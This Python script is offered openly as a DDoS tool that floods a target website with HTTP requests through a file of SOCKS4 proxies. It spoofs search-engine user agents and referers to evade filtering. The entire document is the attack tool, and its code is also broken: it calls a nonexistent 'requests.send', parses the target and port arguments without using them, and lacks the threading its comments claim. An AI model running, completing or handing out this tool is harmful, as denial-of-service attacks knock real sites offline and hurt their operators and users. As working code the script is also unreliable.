## Software Title: DDoS Script using CC Attack
## Software Version: 1.0
## Software Description: This Software is used to Perfom Denial of Service Attack on a Website, and take it down. socks 4 proxies
## Software Author: g0dsecurity

## Importing pysocks, argparse, and socket
import socks, argparse, socket, requests, random, threading

## Arguments
parser = argparse.ArgumentParser(description='DDoS Script using CC Attack')
parser.add_argument('-t', '--target', help='Target URL', required=True)
parser.add_argument('-p', '--port', help='Target Port', required=True)
parser.add_argument('-s', '--socks', help='Socks 4 Proxy List', required=True)

args = parser.parse_args()

args_target = args.target
args_port = int(args.port)
args_socks = args.socks


## Banner
print ('''
___________     .__.__    _________                      
\_   _____/__  _|__|  |   \_   ___ \  _________________  
 |    __)_\  \/ /  |  |   /    \  \/ /  _ \_  __ \____ \ 
 |        \\   /|  |  |__ \     \___(  <_> )  | \/  |_> >
/_______  / \_/ |__|____/  \______  /\____/|__|  |   __/ 
        \/                        \/             |__|   
>--------------------------------------------->
Version 1.0''')


Aceptall = [
    
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
    'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    'chrome 41.0.2228.0',
    'Internet Explorer 11.0',
]


referers = [
    "https://www.google.com/search?q=",
    "check-host.net/",
    "https://www.facebook.com/",
    "search.yahoo.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://www.reddit.com/search?q=",
]


## Getting the Socks 4 Proxies from a file
socks_file = open(args_socks, 'r')
socks_lines = socks_file.readlines()
socks_count = len(socks_lines)
socks_file.close()

## This function will send Get Requests to the Target and take it down
def DDoS(url):
    DDoS_req = requests.get(url, headers={'User-Agent': random.choice(Aceptall)})
    DDoS_req = requests.send(url, headers={'Referer': random.choice(referers)})
    TCPPACKETS = random._urandom(1024)
    print ('[*] Attacking ' + url)
    print ('[*] Response: ' + str(DDoS_req.status_code))


## Put an Menu option, to choose what target attack, and what port
target = str(input('Target: '))
port = int(input('Port: '))

## Threading To attack more faster
for i in range(socks_count):
    socks_split = socks_lines[i].split(':')
    socks_ip = socks_split[0]
    socks_port = int(socks_split[1])
    socks_type = socks_split[2].replace('\n', '')

    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, socks_ip, socks_port)
    socket.socket = socks.socksocket

    url = 'http://' + target
    DDoS(url)
    


